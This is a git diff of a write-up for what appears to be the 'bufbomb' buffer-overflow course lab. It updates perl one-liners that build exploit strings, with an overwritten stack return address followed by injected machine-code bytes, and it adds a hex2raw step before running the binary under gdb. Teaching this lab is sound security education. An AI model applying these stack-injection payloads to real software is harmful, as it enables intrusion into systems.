@@ -204,13 +204,14 @@ Disassembly of section .text:
 Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:
 
 ```
-unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "98 31 68 55 ", "b8 0c c7 8c 2d 68 93 8c 04 08"' > hexlevel3
+unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d 68 93 8c 04 08"' > hexlevel3
 ```
 
-"98 31 68 55 " is the little endian address of where our exploit resides on the stack from level 2. When we inject the exploit onto the stack, this address will be what the eip points to after returning from getbuf().
+"58 33 68 55 " is the little endian address of where our exploit resides on the stack from level 2. When we inject the exploit onto the stack, this address will be what the eip points to after returning from getbuf().
 
 Now type:
 ```
+unix> ./hex2raw < hexlevel3 > raw
 unix> gdb bufbomb
 (gdb) break *test+3
 (gdb) run -u quinnliu
@@ -272,7 +273,7 @@ Disassembly of section .text:
 Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:
 
 ```
-unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "98 31 68 55 ", "b8 0c c7 8c 2d bd 80 33 68 55 68 93 8c 04 08" ' > hexlevel3_2
+unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d bd 80 33 68 55 68 93 8c 04 08" ' > hexlevel3_2
 ```
 
 Now type:
